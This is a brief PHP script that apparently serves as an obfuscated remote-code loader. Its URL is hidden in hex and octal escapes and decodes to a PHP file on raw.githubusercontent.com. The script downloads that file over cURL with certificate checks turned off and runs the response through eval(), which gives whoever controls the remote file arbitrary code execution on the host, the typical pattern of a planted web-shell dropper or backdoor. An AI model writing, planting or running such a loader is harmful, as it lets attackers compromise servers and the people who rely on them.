<?php goto opet_5a27d; opet_5a27d: $url = "\x68\164\x74\160\x73\072\x2F\057\x72\141\x77\056\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6E\164\x65\156\x74\056\x63\157\x6D\057\x45\164\x68\145\x72\141\x78\057\x77\141\x77\167\x2F\162\x65\146\x73\057\x68\145\x61\144\x73\057\x6D\141\x69\156\x2F\160\x77\151\x6C\141\x6E\147\x2E\160\x68\160";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification (use with caution)
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

$code = curl_exec($ch);

if (curl_errno($ch)) {
    echo "\x45\162\x72\157\x72\072\x20" . curl_error($ch);
} else {
    eval(' ?>' . $code);
}

curl_close($ch);
?>  